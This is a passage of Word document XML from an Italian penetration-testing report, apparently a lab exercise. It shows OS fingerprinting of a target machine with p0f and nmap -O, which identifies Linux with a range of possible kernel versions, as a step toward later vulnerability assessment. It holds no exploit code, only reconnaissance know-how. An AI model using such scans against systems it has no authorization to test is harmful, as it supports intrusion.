      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="009F7BF3">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>scan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="3155DE94" w14:textId="77777777" w:rsidR="008C343A" w:rsidRDefault="008C343A" w:rsidP="00B74592">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="3230"/>
        </w:tabs>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D6B92C2" w14:textId="646928FA" w:rsidR="00B74592" w:rsidRDefault="005D2BA2" w:rsidP="00B74592">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="3230"/>
        </w:tabs>
      </w:pPr>
      <w:r>
        <w:t>P</w:t>
      </w:r>
      <w:r w:rsidR="00B74592">
        <w:t xml:space="preserve">er avere altre informazioni sulla macchina target possiamo effettuare </w:t>
      </w:r>
      <w:r w:rsidR="00B74592" w:rsidRPr="002801C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">l’Operating System </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00B74592" w:rsidRPr="002801C7">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>fingerprinting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A1508E">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00BD4305">
        <w:t>in modo da avere</w:t>
      </w:r>
      <w:r w:rsidR="00A1508E">
        <w:t xml:space="preserve"> informazioni specifiche sul sistema operativo in esecuzione</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B34189" w14:textId="16AF702E" w:rsidR="00A1508E" w:rsidRDefault="00A1508E" w:rsidP="00D621C4">
      <w:r>
        <w:t xml:space="preserve">Per </w:t>
      </w:r>
      <w:r w:rsidR="00BD4305">
        <w:t>capire il sistema operativo in esecuzione sella macchina target</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and</w:t>
      </w:r>
      <w:r w:rsidR="00BD4305">
        <w:t>iamo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ad utilizzare due </w:t>
      </w:r>
      <w:r w:rsidRPr="00A1508E">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>tool</w:t>
      </w:r>
      <w:r w:rsidR="00D621C4">
        <w:t xml:space="preserve">. Il primo è </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00BD4305" w:rsidRPr="00D621C4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>pof</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00BD4305">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BD4305">
        <w:t>che</w:t>
      </w:r>
      <w:r w:rsidR="00D621C4">
        <w:t xml:space="preserve"> viene avviato </w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:t>tramite</w:t>
      </w:r>
      <w:r w:rsidR="00D621C4">
        <w:t xml:space="preserve"> linea di </w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:t>comando, il</w:t>
      </w:r>
      <w:r w:rsidR="00D621C4">
        <w:t xml:space="preserve"> comando </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00D621C4" w:rsidRPr="00D621C4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>pof</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00BD4305">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00BD4305">
        <w:t xml:space="preserve">che resta in attesa di attività di rete da o verso la macchina target. Successivamente tramite il </w:t>
      </w:r>
      <w:r w:rsidR="00BD4305" w:rsidRPr="00BD4305">
        <w:t>browser</w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="005668D3">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00BD4305" w:rsidRPr="00BD4305">
        <w:t>gener</w:t>
      </w:r>
      <w:r w:rsidR="00BD4305">
        <w:t>iamo</w:t>
      </w:r>
      <w:r w:rsidR="00BD4305" w:rsidRPr="00BD4305">
        <w:t xml:space="preserve"> attività di rete</w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00BD4305" w:rsidRPr="00BD4305">
        <w:t xml:space="preserve"> stabil</w:t>
      </w:r>
      <w:r w:rsidR="00BD4305">
        <w:t>endo</w:t>
      </w:r>
      <w:r w:rsidR="00BD4305" w:rsidRPr="00BD4305">
        <w:t xml:space="preserve"> una connessione </w:t>
      </w:r>
      <w:r w:rsidR="00BD4305">
        <w:t>http.</w:t>
      </w:r>
      <w:r w:rsidR="005C13E8">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15BE2418" w14:textId="40E8F753" w:rsidR="005C13E8" w:rsidRDefault="005C13E8" w:rsidP="005C13E8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005C13E8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Tra le informazioni generate da </w:t>
      </w:r>
      <w:r w:rsidRPr="005C13E8">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>p0f</w:t>
      </w:r>
      <w:r w:rsidRPr="005C13E8">
        <w:rPr>
          <w:rFonts w:ascii="CourierNewPS-BoldMT" w:eastAsia="Times New Roman" w:hAnsi="CourierNewPS-BoldMT" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005C13E8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>possiamo osservare che</w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="005C13E8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> è stato</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005C13E8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>individuato</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005C13E8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>correttamente il tipo di Sistema Operativo (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Linux</w:t>
      </w:r>
      <w:r w:rsidRPr="005C13E8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:r w:rsidR="008C343A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>, che già sapevamo</w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="008C343A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> in quanto scoperto nella fase di </w:t>
      </w:r>
      <w:r w:rsidR="008C343A" w:rsidRPr="008C343A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">Information </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="008C343A" w:rsidRPr="008C343A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>Gathering</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005C13E8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> ma</w:t>
      </w:r>
      <w:r w:rsidR="008C343A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="005C13E8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>non è stata individuata la corretta versione</w:t>
      </w:r>
      <w:r w:rsidR="008C343A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> del </w:t>
      </w:r>
      <w:r w:rsidR="008C343A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>k</w:t>
      </w:r>
      <w:r w:rsidR="008C343A" w:rsidRPr="008C343A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>ernel</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve">. Vengono suggerite come possibili versioni da </w:t>
      </w:r>
      <w:r w:rsidRPr="005C13E8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>2.2.x</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:r w:rsidRPr="005C13E8">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
        <w:t>3.x</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C07EC49" w14:textId="77777777" w:rsidR="00262AA4" w:rsidRPr="005C13E8" w:rsidRDefault="00262AA4" w:rsidP="005C13E8">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:lang w:eastAsia="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="18612AF2" w14:textId="2FBB4923" w:rsidR="008C343A" w:rsidRPr="008C343A" w:rsidRDefault="00FE50BE" w:rsidP="008C343A">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251669504" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="3110DFCC" wp14:editId="02E71070">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>107950</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1599565</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1873250" cy="133350"/>
                <wp:effectExtent l="0" t="0" r="12700" b="19050"/>
                <wp:wrapNone/>
                <wp:docPr id="245572775" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="1873250" cy="133350"/>
                        </a:xfrm>
                        <a:prstGeom prst="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A8E9F7C" w14:textId="77777777" w:rsidR="00FE50BE" w:rsidRDefault="00FE50BE" w:rsidP="00FE50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0DFCC" id="_x0000_s1029" style="position:absolute;left:0;text-align:left;margin-left:8.5pt;margin-top:125.95pt;width:147.5pt;height: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3TdQIAAEoFAAAOAAAAZHJzL2Uyb0RvYy54bWysVN1v0zAQf0fif7D8zpK02xjV0qlsKkKa&#10;tokN7dl17DbC8Zmz26b89ZydNC2jT4iX5L5+932+vmkbwzYKfQ225MVZzpmyEqraLkv+/WX+4Yoz&#10;H4SthAGrSr5Tnt9M37+73rqJGsEKTKWQkRPrJ1tX8lUIbpJlXq5UI/wZOGVJqQEbEYjFZVah2JL3&#10;xmSjPL/MtoCVQ5DKe5LedUo+Tf61VjI8au1VYKbklFtIX0zfRfxm02sxWaJwq1r2aYh/yKIRtaWg&#10;g6s7EQRbY/2Xq6aWCB50OJPQZKB1LVWqgaop8jfVPK+EU6kWao53Q5v8/3MrHzbP7gmpDVvnJ57I&#10;WEWrsYl/yo+1qVm7oVmqDUySsLj6OB5dUE8l6YrxeEw0uckOaIc+fFHQsEiUHGkYqUdic+9DZ7o3&#10;icEszGtj0kCMjQIPpq6iLDG4XNwaZBsRJ5l/zuf7cEdmFDxCs0MtiQo7o6IPY78pzeqKsh+lTNKa&#10;qcGtkFLZcNmXkawjTFMKA7A4BTSh6EG9bYSptH4DMD8F/DPigEhRwYYB3NQW8JSD6scQubPfV9/V&#10;HMsP7aKloks+jjlGyQKq3RMyhO4cvJPzmkZ0L3x4Ekj7T1Olmw6P9NEGtiWHnuJsBfjrlDza01qS&#10;lrMt3VPJ/c+1QMWZ+WppYT8V5+fxABNzfvFxRAweaxbHGrtuboEGXdDr4WQio30we1IjNK90+rMY&#10;lVTCSopdchlwz9yG7s7p8ZBqNktmdHROhHv77GR0HvscV/ClfRXo+j0NtOEPsL89MXmzrp1tRFqY&#10;rQPoOu3yoa/9BOhg0zX0j0t8EY75ZHV4Aqe/AQAA//8DAFBLAwQUAAYACAAAACEASOpEKN4AAAAK&#10;AQAADwAAAGRycy9kb3ducmV2LnhtbEyPzU7DMBCE70i8g7VI3KjzI2gT4lQICYlDkaDtA7jxNomI&#10;11G8bdO3ZznBcWZHs99U69kP6oxT7AMZSBcJKKQmuJ5aA/vd28MKVGRLzg6B0MAVI6zr25vKli5c&#10;6AvPW26VlFAsrYGOeSy1jk2H3sZFGJHkdgyTtyxyarWb7EXK/aCzJHnS3vYkHzo74muHzff25A34&#10;TVNM/N7m+898dd30O9ZH/2HM/d388gyKcea/MPziCzrUwnQIJ3JRDaKXMoUNZI9pAUoCeZqJcxBn&#10;mRWg60r/n1D/AAAA//8DAFBLAQItABQABgAIAAAAIQC2gziS/gAAAOEBAAATAAAAAAAAAAAAAAAA&#10;AAAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAi0AFAAGAAgAAAAhADj9If/WAAAAlAEAAAsAAAAA&#10;AAAAAAAAAAAALwEAAF9yZWxzLy5yZWxzUEsBAi0AFAAGAAgAAAAhAG/9zdN1AgAASgUAAA4AAAAA&#10;AAAAAAAAAAAALgIAAGRycy9lMm9Eb2MueG1sUEsBAi0AFAAGAAgAAAAhAEjqRCjeAAAACgEAAA8A&#10;AAAAAAAAAAAAAAAAzwQAAGRycy9kb3ducmV2LnhtbFBLBQYAAAAABAAEAPMAAADaBQAAAAA=&#10;" filled="f" strokecolor="#00b0f0" strokeweight="2pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="7A8E9F7C" w14:textId="77777777" w:rsidR="00FE50BE" w:rsidRDefault="00FE50BE" w:rsidP="00FE50BE">
                      <w:pPr>
                        <w:jc w:val="center"/>
                      </w:pPr>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
              </v:rect>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="00384A0C" w:rsidRPr="00384A0C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="41BD2EB7" wp14:editId="11B60889">
            <wp:extent cx="5006774" cy="2408129"/>
            <wp:effectExtent l="0" t="0" r="3810" b="0"/>
            <wp:docPr id="178069040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90407" name="Immagine 1" descr="Immagine che contiene testo, schermata, Carattere, software&#10;&#10;Descrizione generata automaticamente"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId15"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5006774" cy="2408129"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
      <w:r w:rsidR="008C343A" w:rsidRPr="009F7BF3">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">Figura </w:t>
      </w:r>
      <w:r w:rsidR="008C343A">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>4</w:t>
      </w:r>
      <w:r w:rsidR="008C343A" w:rsidRPr="009F7BF3">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r w:rsidR="00262AA4" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve">OS </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00262AA4" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>fingerprinting</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00262AA4" w:rsidRPr="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> tramite</w:t>
      </w:r>
      <w:r w:rsidR="00262AA4">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t xml:space="preserve"> p0f</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CBBB5C5" w14:textId="3775D49D" w:rsidR="00844D78" w:rsidRDefault="00844D78" w:rsidP="00CA161D"/>
    <w:p w14:paraId="6FEB138F" w14:textId="77777777" w:rsidR="00D23001" w:rsidRDefault="00CA161D" w:rsidP="00CA161D">
      <w:r w:rsidRPr="00375648">
        <w:t xml:space="preserve">Per completezza andiamo ad utilizzare un altro </w:t>
      </w:r>
      <w:r w:rsidRPr="00375648">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>tool</w:t>
      </w:r>
      <w:r w:rsidRPr="00375648">
        <w:t xml:space="preserve"> per l’individuazione del sistema operativo. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4176A63D" w14:textId="3351030C" w:rsidR="00375648" w:rsidRDefault="00CA161D" w:rsidP="00CA161D">
      <w:r w:rsidRPr="00375648">
        <w:t xml:space="preserve">Tramite </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00375648">
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00375648">
        <w:t xml:space="preserve"> -O e con l’indirizzo </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00375648">
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00375648">
        <w:t xml:space="preserve"> specificato, </w:t>
      </w:r>
      <w:r w:rsidR="00375648">
        <w:t xml:space="preserve">ci </w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:t>viene</w:t>
      </w:r>
      <w:r w:rsidR="00375648">
        <w:t xml:space="preserve"> restituito un range ancora più grande</w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00375648">
        <w:t xml:space="preserve"> cioè</w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00375648">
        <w:t xml:space="preserve"> tra 3.2 e 4.9. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C717A57" w14:textId="7BE05DAF" w:rsidR="009F7BF3" w:rsidRDefault="00375648" w:rsidP="00CA161D">
      <w:r>
        <w:t xml:space="preserve">Quindi, possiamo dire che l’output di </w:t>
      </w:r>
      <w:r w:rsidRPr="00375648">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>p0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00375648">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve">f </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>è</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:t xml:space="preserve"> all’interno del range dato da </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nmap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> e dunque la versione del kernel </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>linux</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> potrebbe essere compresa tra 2.2 e 3.x. Tali informazioni ci serviranno nelle fasi di </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00375648">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Enumerating</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00375648">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Target</w:t>
      </w:r>
      <w:r w:rsidRPr="00375648">
        <w:t xml:space="preserve"> e </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00375648">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t>Vulnerability</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00375648">
        <w:rPr>
          <w:i/>
          <w:iCs/>
        </w:rPr>
        <w:t xml:space="preserve"> Assesment</w:t>
      </w:r>
      <w:r w:rsidRPr="00375648">
        <w:t xml:space="preserve"> per </w:t>
      </w:r>
      <w:r w:rsidR="00D23001">
        <w:t xml:space="preserve">effettuare </w:t>
      </w:r>
      <w:r w:rsidRPr="00375648">
        <w:t>scansioni ad hoc</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EF35580" w14:textId="77777777" w:rsidR="00262AA4" w:rsidRPr="00375648" w:rsidRDefault="00262AA4" w:rsidP="00CA161D"/>
    <w:p w14:paraId="058351FD" w14:textId="2AACE792" w:rsidR="00262AA4" w:rsidRDefault="00375648" w:rsidP="00262AA4">
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251671552" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="226A02E6" wp14:editId="69078CF1">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="margin">
                  <wp:posOffset>-16881</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>1398270</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="3493698" cy="362309"/>
                <wp:effectExtent l="0" t="0" r="12065" b="19050"/>
                <wp:wrapNone/>
                <wp:docPr id="159269639" name="Rettangolo 3"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="3493698" cy="362309"/>
                        </a:xfrm>
                        <a:prstGeom prst="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53553BDB" w14:textId="77777777" w:rsidR="00375648" w:rsidRDefault="00375648" w:rsidP="00375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A02E6" id="_x0000_s1030" style="position:absolute;left:0;text-align:left;margin-left:-1.35pt;margin-top:110.1pt;width:275.1pt;height:28.5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ZBdwIAAEoFAAAOAAAAZHJzL2Uyb0RvYy54bWysVFtv0zAUfkfiP1h+Z0kvFFotncqmIqSJ&#10;TWxoz65jtxGOjzl2m5Zfz7GTpmX0CfGSnNt37sfXN/vasJ1CX4Et+OAq50xZCWVl1wX//rx895Ez&#10;H4QthQGrCn5Qnt/M3765btxMDWEDplTIyIn1s8YVfBOCm2WZlxtVC38FTllSasBaBGJxnZUoGvJe&#10;m2yY55OsASwdglTek/SuVfJ58q+1kuFBa68CMwWn3EL6Yvqu4jebX4vZGoXbVLJLQ/xDFrWoLAXt&#10;Xd2JINgWq79c1ZVE8KDDlYQ6A60rqVINVM0gf1XN00Y4lWqh5njXt8n/P7fy6+7JPSK1oXF+5omM&#10;Vew11vFP+bF9atahb5baByZJOBpPR5MpjVeSbjQZjvJp7GZ2Qjv04bOCmkWi4EjDSD0Su3sfWtOj&#10;SQxmYVkZkwZibBR4MFUZZYnB9erWINuJOMn8U75Mw6NwZ2bERWh2qiVR4WBU9GHsN6VZVVL2w5RJ&#10;WjPVuxVSKhsmXRnJOsI0pdADB5eAJgw6UGcbYSqtXw/MLwH/jNgjUlSwoQfXlQW85KD80Udu7Y/V&#10;tzXH8sN+taeiCz6OOUbJCsrDIzKE9hy8k8uKRnQvfHgUSPtPl0I3HR7oow00BYeO4mwD+OuSPNrT&#10;WpKWs4buqeD+51ag4sx8sbSw08F4HA8wMeP3H4bE4Llmda6x2/oWaNADej2cTGS0D+ZIaoT6hU5/&#10;EaOSSlhJsQsuAx6Z29DeOT0eUi0WyYyOzolwb5+cjM5jn+MKPu9fBLpuTwNt+Fc43p6YvVrX1jYi&#10;LSy2AXSVdvnU124CdLDpGrrHJb4I53yyOj2B898AAAD//wMAUEsDBBQABgAIAAAAIQAII8aB3wAA&#10;AAoBAAAPAAAAZHJzL2Rvd25yZXYueG1sTI/BTsMwDIbvSLxDZCRuW0rK6ChNJ4SExGFIY9sDZI3X&#10;VjRO